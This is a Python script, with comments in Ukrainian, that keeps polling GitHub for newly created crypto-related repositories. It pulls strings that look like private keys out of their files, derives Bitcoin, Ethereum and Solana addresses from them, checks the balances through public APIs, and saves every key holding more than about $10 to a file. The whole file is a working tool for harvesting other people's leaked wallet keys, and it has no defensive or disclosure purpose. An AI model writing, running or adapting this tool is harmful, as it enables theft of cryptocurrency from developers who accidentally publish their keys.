import aiohttp
import asyncio
import base58
import re
import json
import logging
from urllib.parse import quote
from dotenv import load_dotenv
import os
from datetime import datetime, timedelta, UTC
from bitcoinlib.keys import Key
from web3 import Web3
from solders.pubkey import Pubkey
from solders.keypair import Keypair

# Налаштування логування
logging.basicConfig(
    filename="scanner.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Завантаження змінних із .env
load_dotenv()

# Конфігурація
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY")
ALCHEMY_SOLANA_API_KEY = os.getenv("ALCHEMY_SOLANA_API_KEY")
if not GITHUB_TOKEN:
    raise ValueError("GITHUB_TOKEN not found in .env file")
if not ETHERSCAN_API_KEY:
    raise ValueError("ETHERSCAN_API_KEY not found in .env file")
if not ALCHEMY_SOLANA_API_KEY:
    logging.warning("ALCHEMY_SOLANA_API_KEY not found. Solana balance checking disabled.")
    print("Warning: ALCHEMY_SOLANA_API_KEY not found. Solana balance checking disabled.")
    SOLANA_AVAILABLE = False
else:
    SOLANA_AVAILABLE = True

OUTPUT_FILE = "found_keys.txt"
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}
BASE_URL = "https://api.github.com"
BLOCKCHAIN_API = "https://blockchain.info/balance?active="
ETHERSCAN_API = "https://api.etherscan.io/api"
SOLANA_RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_SOLANA_API_KEY}"
REPO_SCAN_TIMEOUT = 10  # Таймаут для сканування репозиторію (секунди)
SOLANA_REQUEST_TIMEOUT = 5  # Таймаут для Solana-запитів (секунди)
RECENT_MINUTES = 5  # Сканувати репозиторії, створені за останні 5 хвилин
SCAN_INTERVAL_SECONDS = 60  # Інтервал між скануваннями (секунди)

# Фіксовані ціни криптовалют (17 квітня 2025)
CRYPTO_PRICES = {
    "bitcoin": 60000.0,  # $60,000 за BTC
    "ethereum": 2500.0,  # $2,500 за ETH
    "solana": 150.0      # $150 за SOL
}

# Пороги балансу (еквівалент $10)
BALANCE_THRESHOLDS = {
    "BTC": 10.0 / CRYPTO_PRICES["bitcoin"],  # 0.00016667 BTC
    "ETH": 10.0 / CRYPTO_PRICES["ethereum"], # 0.004 ETH
    "SOL": 10.0 / CRYPTO_PRICES["solana"]    # 0.06666667 SOL
}

# Ключові слова, пов’язані з криптовалютою та платформами (150 термінів)
CRYPTO_KEYWORDS = [
    "crypto", "blockchain", "bitcoin", "ethereum", "solana", "wallet",
    "defi", "nft", "dex", "dapp", "token", "smartcontract", "web3",
    "pumpfun", "raydium", "jupiter", "orca", "serum", "binance", "polygon",
    "avalanche", "arbitrum", "optimism", "cardano", "polkadot", "cosmos",
    "tezos", "algorand", "near", "aptos", "sui", "hedera", "tron", "eos",
    "stellar", "ripple", "chainlink", "uniswap", "aave", "compound", "curve",
    "sushi", "pancakeswap", "balancer", "yearn", "maker", "synthetix",
    "1inch", "kyber", "bancor", "opensea", "rarible", "foundation", "zora",
    "superrare", "niftygateway", "coinbase", "kraken", "kucoin", "bybit",
    "bitfinex", "huobi", "okx", "gateio", "zksync", "starknet", "base",
    "blast", "linea", "scroll", "mantle", "matic", "ada", "dot", "atom",
    "xtz", "algo", "hbar", "trx", "xlm", "xrp", "link", "eth", "sol",
    "bnb", "avax", "op", "arb", "nonfungible", "decentralized", "yieldfarming",
    "liquiditypool", "staking", "governance", "dao", "airdrop", "ico", "ido",
    "ieo", "metaverse", "gamefi", "playtoearn", "cryptowallet", "ledger",
    "trezor", "metamask", "trustwallet", "safepal", "phantom", "solflare",
    "saber", "marinade", "drift", "stepn", "francium", "tulip", "mango",
    "lifinity", "atrix", "psyoptions", "zeta", "bonfida", "aurory", "staratlas",
    "degenape", "solsea", "magiceden", "ftx", "gemini", "bitstamp", "bittrex",
    "upbit", "decentraland", "sandbox", "axieinfinity", "cryptopunks", "boredape",
    "meebits", "doodles", "azuki", "clonex", "moonbirds", "veefriends",
    "worldofwomen", "artblocks", "chromie", "pudgypenguins", "bayc", "mayc",
    "ens", "lens", "crosschain", "bridge", "layer2", "rollup", "sidechain"
]

# Набори для відстеження унікальних ключів і репозиторіїв
FOUND_KEYS = set()
KEY_DUPLICATE_COUNT = {}  # Лічильник дублікатів ключів
PROCESSED_REPOS = set()

# Функція для перевірки, чи є рядок валідним Base58 приватним ключем
def is_base58_key(data):
    try:
        decoded = base58.b58decode(data)
        if len(decoded) in [32, 33, 64]:
            return True
    except:
        pass
    return False

# Функція для пошуку байтових приватних ключів (hex-представлення)
def is_hex_key(data):
    hex_pattern = r"^[0-9a-fA-F]{64}$"
    if not bool(re.match(hex_pattern, data)):
        return False
    # Ігнорувати нульовий ключ
    if data == "0000000000000000000000000000000000000000000000000000000000000000":
        logging.info(f"Skipping known test key: {data}")
        print(f"Skipping known test key: {data[:8]}...")
        return False
    return True

# Функція для пошуку байтових ключів у форматі масиву
def is_byte_array_key(data):
    byte_array_pattern = r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]"
    if not bool(re.match(byte_array_pattern, data)):
        return False
    try:
        cleaned = data.strip("[]").replace(" ", "")
        bytes_list = [int(x) for x in cleaned.split(",") if x]
        if len(bytes_list) != 32:
            return False
        hex_key = "".join([format(b, "02x") for b in bytes_list])
        if is_hex_key(hex_key):
            return hex_key
        return False
    except:
        return False

# Функція для конвертації приватного ключа в Bitcoin-адресу
def private_key_to_btc_address(private_key, is_hex=False):
    try:
        if is_hex:
            key = Key(private_key, is_private=True, import_key=True)
        else:
            key = Key(private_key, is_private=True, import_key=True, key_format='wif')
        return key.address()
    except Exception as e:
        logging.error(f"Error converting private key to BTC address: {e}")
        print(f"Error converting private key to BTC address: {e}")
        return None

# Функція для конвертації приватного ключа в Ethereum-адресу
def private_key_to_eth_address(private_key):
    try:
        w3 = Web3()
        if not is_hex_key(private_key):
            return None
        private_key = private_key if private_key.startswith("0x") else "0x" + private_key
        account = w3.eth.account.from_key(private_key)
        return account.address
    except Exception as e:
        logging.error(f"Error converting private key to ETH address: {e}")
        print(f"Error converting private key to ETH address: {e}")
        return None

# Функція для конвертації приватного ключа в Solana-адресу
def private_key_to_sol_address(private_key):
    if not SOLANA_AVAILABLE:
        return None
    try:
        private_key_bytes = bytes.fromhex(private_key)
        keypair = Keypair.from_seed(private_key_bytes[:32])
        return str(keypair.pubkey())
    except Exception as e:
        logging.error(f"Error converting private key to SOL address: {e}")
        print(f"Error converting private key to SOL address: {e}")
        return None

# Асинхронна функція для перевірки балансу
async def get_balance(session, private_key, is_hex=False, is_byte_array=False):
    balances = {}

    # Визначаємо тип ключа
    if is_base58_key(private_key) and not is_hex and not is_byte_array:
        # Base58 ключ — перевіряємо тільки Bitcoin
        print(f"Checking Bitcoin balance for key: {private_key[:8]}...")
        btc_address = private_key_to_btc_address(private_key, is_hex=False)
        if btc_address:
            try:
                async with session.get(f"{BLOCKCHAIN_API}{btc_address}") as response:
                    if response.status == 200:
                        data = await response.json()
                        balance_satoshi = data.get(btc_address, {}).get("final_balance", 0)
                        balance_btc = balance_satoshi / 100_000_000
                        usd_value = balance_btc * CRYPTO_PRICES["bitcoin"]
                        if balance_btc >= BALANCE_THRESHOLDS["BTC"]:
                            balances["BTC"] = balance_btc
                            print(f"Found Bitcoin balance: {balance_btc:.8f} BTC (${usd_value:.2f})")
                        else:
                            print(f"Bitcoin balance too low: {balance_btc:.8f} BTC (${usd_value:.2f})")
                    else:
                        logging.warning(f"Failed to check BTC balance for {btc_address}: {response.status}")
                        print(f"Failed to check BTC balance: {response.status}")
            except Exception as e:
                logging.error(f"Error checking BTC balance for {btc_address}: {e}")
                print(f"Error checking BTC balance: {e}")

    elif (is_hex or is_byte_array) and not is_base58_key(private_key):
        # Hex або байтовий ключ — перевіряємо Ethereum і Solana
        # Ethereum
        print(f"Checking Ethereum balance for key: {private_key[:8]}...")
        eth_address = private_key_to_eth_address(private_key)
        if eth_address:
            try:
                params = {
                    "module": "account",
                    "action": "balance",
                    "address": eth_address,
                    "tag": "latest",
                    "apikey": ETHERSCAN_API_KEY
                }
                async with session.get(ETHERSCAN_API, params=params) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data["status"] == "1":
                            balance_wei = int(data["result"])
                            balance_eth = balance_wei / 1_000_000_000_000_000_000
                            usd_value = balance_eth * CRYPTO_PRICES["ethereum"]
                            if balance_eth >= BALANCE_THRESHOLDS["ETH"]:
                                balances["ETH"] = balance_eth
                                print(f"Found Ethereum balance: {balance_eth:.8f} ETH (${usd_value:.2f})")
                            else:
                                print(f"Ethereum balance too low: {balance_eth:.8f} ETH (${usd_value:.2f})")
                        else:
                            logging.warning(f"Failed to check ETH balance for {eth_address}: {data['message']}")
                            print(f"Failed to check ETH balance: {data['message']}")
                    else:
                        logging.warning(f"Failed to check ETH balance for {eth_address}: {response.status}")
                        print(f"Failed to check ETH balance: {response.status}")
            except Exception as e:
                logging.error(f"Error checking ETH balance for {eth_address}: {e}")
                print(f"Error checking ETH balance: {e}")

        # Solana (якщо доступно)
        if SOLANA_AVAILABLE:
            print(f"Checking Solana balance for key: {private_key[:8]}...")
            sol_address = private_key_to_sol_address(private_key)
            if sol_address:
                try:
                    async with session.post(
                        SOLANA_RPC,
                        json={
                            "jsonrpc": "2.0",
                            "id": 1,
                            "method": "getBalance",
                            "params": [sol_address]
                        },
                        timeout=SOLANA_REQUEST_TIMEOUT
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            balance_lamports = data.get("result", {}).get("value", 0)
                            balance_sol = balance_lamports / 1_000_000_000
                            usd_value = balance_sol * CRYPTO_PRICES["solana"]
                            if balance_sol >= BALANCE_THRESHOLDS["SOL"]:
                                balances["SOL"] = balance_sol
                                print(f"Found Solana balance: {balance_sol:.8f} SOL (${usd_value:.2f})")
                            else:
                                print(f"Solana balance too low: {balance_sol:.8f} SOL (${usd_value:.2f})")
                        else:
                            logging.warning(f"Failed to check SOL balance for {sol_address}: {response.status}")
                            print(f"Failed to check SOL balance: {response.status}")
                except asyncio.TimeoutError:
                    logging.warning(f"Timeout checking SOL balance for {sol_address}: exceeded {SOLANA_REQUEST_TIMEOUT} seconds")
                    print(f"Timeout checking SOL balance for {sol_address}: exceeded {SOLANA_REQUEST_TIMEOUT} seconds")
                except Exception as e:
                    logging.error(f"Error checking SOL balance for {sol_address}: {e}")
                    print(f"Error checking SOL balance: {e}")

    return balances

# Асинхронна функція для сканування вмісту файлу
async def scan_file_content(session, file_url, repo_name):
    try:
        async with session.get(file_url, headers=HEADERS) as response:
            if response.status != 200:
                logging.warning(f"Failed to fetch file {file_url}: {response.status}")
                print(f"Warning: Failed to fetch file {file_url}: {response.status}")
                return []
            content = await response.text()
    except Exception as e:
        logging.error(f"Error fetching file {file_url}: {e}")
        print(f"Error fetching file {file_url}: {e}")
        return []

    found_keys = []

    # Пошук Base58 ключів
    base58_candidates = re.findall(r"[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51,52}", content)
    for candidate in base58_candidates:
        if is_base58_key(candidate):
            if candidate in FOUND_KEYS:
                KEY_DUPLICATE_COUNT[candidate] = KEY_DUPLICATE_COUNT.get(candidate, 1) + 1
                logging.info(f"Duplicate Base58 key in {repo_name}: {candidate} (count: {KEY_DUPLICATE_COUNT[candidate]})")
                print(f"Duplicate Base58 key found in {repo_name}: {candidate[:8]}... (count: {KEY_DUPLICATE_COUNT[candidate]})")
                continue
            print(f"Found Base58 key in {repo_name}: {candidate[:8]}...")
            balances = await get_balance(session, candidate, is_hex=False, is_byte_array=False)
            if balances:
                FOUND_KEYS.add(candidate)
                KEY_DUPLICATE_COUNT[candidate] = 1
                found_keys.append({
                    "key": candidate,
                    "repo": repo_name,
                    "balances": balances
                })
                logging.info(f"Found Base58 key in {repo_name}: {candidate} with balances {balances}")

    # Пошук hex-ключів
    hex_candidates = re.findall(r"[0-9a-fA-F]{64}", content)
    for candidate in hex_candidates:
        if is_hex_key(candidate):
            if candidate in FOUND_KEYS:
                KEY_DUPLICATE_COUNT[candidate] = KEY_DUPLICATE_COUNT.get(candidate, 1) + 1
                logging.info(f"Duplicate Hex key in {repo_name}: {candidate} (count: {KEY_DUPLICATE_COUNT[candidate]})")
                print(f"Duplicate Hex key found in {repo_name}: {candidate[:8]}... (count: {KEY_DUPLICATE_COUNT[candidate]})")
                continue
            print(f"Found Hex key in {repo_name}: {candidate[:8]}...")
            balances = await get_balance(session, candidate, is_hex=True, is_byte_array=False)
            if balances:
                FOUND_KEYS.add(candidate)
                KEY_DUPLICATE_COUNT[candidate] = 1
                found_keys.append({
                    "key": candidate,
                    "repo": repo_name,
                    "balances": balances
                })
                logging.info(f"Found Hex key in {repo_name}: {candidate} with balances {balances}")

    # Пошук байтових ключів
    byte_array_candidates = re.findall(r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]", content)
    for candidate in byte_array_candidates:
        hex_key = is_byte_array_key(candidate)
        if hex_key:
            if hex_key in FOUND_KEYS:
                KEY_DUPLICATE_COUNT[hex_key] = KEY_DUPLICATE_COUNT.get(hex_key, 1) + 1
                logging.info(f"Duplicate byte array key in {repo_name}: {candidate} (hex: {hex_key}, count: {KEY_DUPLICATE_COUNT[hex_key]})")
                print(f"Duplicate byte array key found in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}..., count: {KEY_DUPLICATE_COUNT[hex_key]})")
                continue
            print(f"Found byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
            balances = await get_balance(session, hex_key, is_hex=True, is_byte_array=True)
            if balances:
                FOUND_KEYS.add(hex_key)
                KEY_DUPLICATE_COUNT[hex_key] = 1
                found_keys.append({
                    "key": hex_key,
                    "repo": repo_name,
                    "balances": balances
                })
                logging.info(f"Found byte array key in {repo_name}: {candidate} (hex: {hex_key}) with balances {balances}")

    return found_keys

# Асинхронна функція для сканування репозиторію
async def scan_repository(session, repo):
    repo_name = repo["full_name"]
    contents_url = f"{BASE_URL}/repos/{repo_name}/contents"

    try:
        async with session.get(contents_url, headers=HEADERS) as response:
            if response.status != 200:
                logging.warning(f"Failed to fetch contents for {repo_name}: {response.status}")
                print(f"Warning: Failed to fetch contents for {repo_name}: {response.status}")
                return []
            contents = await response.json()
    except Exception as e:
        logging.error(f"Error fetching contents for {repo_name}: {e}")
        print(f"Error fetching contents for {repo_name}: {e}")
        return []

    found_keys = []
    tasks = []

    for item in contents:
        if item["type"] == "file" and item["name"].endswith((".py", ".txt", ".json")) and not item["name"].lower() == "readme.md":
            file_url = item["download_url"]
            if file_url:
                tasks.append(scan_file_content(session, file_url, repo_name))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, list):
            found_keys.extend(result)

    return found_keys

# Функція для збереження ключів у файл
def save_keys(keys):
    if not keys:
        return
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        for key_info in keys:
            f.write(f"{key_info['key']}\n")
    logging.info(f"Saved {len(keys)} keys to {OUTPUT_FILE}")
    print(f"Saved {len(keys)} keys to {OUTPUT_FILE}")

# Асинхронна функція для завантаження пачки репозиторіїв
async def fetch_repos(session):
    current_time = datetime.now(UTC)
    start_time = current_time - timedelta(minutes=RECENT_MINUTES)
    start_time_str = start_time.strftime("%Y-%m-%dT%H:%M")  # Формат без секунд
    all_repos = []
    seen_repo_ids = set()  # Для уникнення дублікатів репозиторіїв

    # Розбиваємо ключові слова на підмножини по 6 (5 OR операторів)
    for i in range(0, len(CRYPTO_KEYWORDS), 6):
        keywords_subset = CRYPTO_KEYWORDS[i:i+6]
        if not keywords_subset:
            continue
        keywords_query = " OR ".join(keywords_subset)
        search_query = f"{keywords_query} created:>={start_time_str}"
        search_url = f"{BASE_URL}/search/repositories?q={quote(search_query)}&sort=created&order=desc"
        page = 1

        print(f"Fetching repositories for keywords: {keywords_query} created after {start_time_str}...")
        logging.info(f"Fetching repositories for keywords: {keywords_query} created after {start_time_str}...")
        while True:
            try:
                async with session.get(f"{search_url}&page={page}&per_page=100", headers=HEADERS) as response:
                    if response.status != 200:
                        error_text = await response.text()
                        logging.error(f"Error fetching repositories: {response.status}, Response: {error_text}")
                        print(f"Error fetching repositories: {response.status}, Response: {error_text}")
                        break
                    remaining = response.headers.get("X-RateLimit-Remaining")
                    logging.info(f"API requests remaining: {remaining}")
                    print(f"API requests remaining: {remaining}")
                    if int(remaining) < 10:
                        logging.warning("Low API rate limit, pausing for 60 seconds")
                        print("Low API rate limit, pausing for 60 seconds...")
                        await asyncio.sleep(60)
                    data = await response.json()
                    page_repos = data.get("items", [])
                    if not page_repos:
                        break
                    # Фільтрація репозиторіїв за точним часом створення
                    filtered_repos = [
                        repo for repo in page_repos
                        if datetime.strptime(repo["created_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=UTC) >= start_time
                        and repo["id"] not in seen_repo_ids
                    ]
                    for repo in filtered_repos:
                        seen_repo_ids.add(repo["id"])
                    all_repos.extend(filtered_repos)
            except Exception as e:
                logging.error(f"Error fetching repositories: {e}")
                print(f"Error fetching repositories: {e}")
                break

            page += 1
            await asyncio.sleep(2)  # Затримка для уникнення обмежень API

        await asyncio.sleep(2)  # Затримка між підмножинами ключових слів

    # Сортування репозиторіїв від найновіших
    sorted_repos = sorted(
        all_repos,
        key=lambda x: datetime.strptime(x["created_at"], "%Y-%m-%dT%H:%M:%SZ"),
        reverse=True
    )
    logging.info(f"Fetched {len(sorted_repos)} repositories created after {start_time_str}")
    print(f"Fetched {len(sorted_repos)} repositories created after {start_time_str}")
    return sorted_repos

# Асинхронна функція для одноразового сканування
async def main_once():
    async with aiohttp.ClientSession() as session:
        repos = await fetch_repos(session)

        for repo in repos:
            repo_name = repo["full_name"]
            if repo_name in PROCESSED_REPOS:
                logging.info(f"Skipping already processed repository: {repo_name}")
                print(f"Skipping already processed repository: {repo_name}")
                continue
            created_at = datetime.strptime(repo["created_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=UTC)
            logging.info(f"Scanning {repo_name} (created: {created_at})")
            print(f"Scanning {repo_name} (created: {created_at})")
            try:
                keys = await asyncio.wait_for(
                    scan_repository(session, repo),
                    timeout=REPO_SCAN_TIMEOUT
                )
                if keys:
                    save_keys(keys)
                    logging.info(f"Found {len(keys)} keys with positive balance in {repo_name}")
                    print(f"Found {len(keys)} keys with positive balance in {repo_name}")
            except asyncio.TimeoutError:
                logging.warning(f"Timeout scanning {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
                print(f"Timeout scanning {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
            except Exception as e:
                logging.error(f"Error scanning {repo_name}: {e}")
                print(f"Error scanning {repo_name}: {e}")
            PROCESSED_REPOS.add(repo_name)

# Основна функція для безперервного моніторингу
async def main():
    while True:
        await main_once()
        print(f"Waiting {SCAN_INTERVAL_SECONDS} seconds for next scan...")
        logging.info(f"Waiting {SCAN_INTERVAL_SECONDS} seconds for next scan...")
        await asyncio.sleep(SCAN_INTERVAL_SECONDS)

if __name__ == "__main__":
    asyncio.run(main())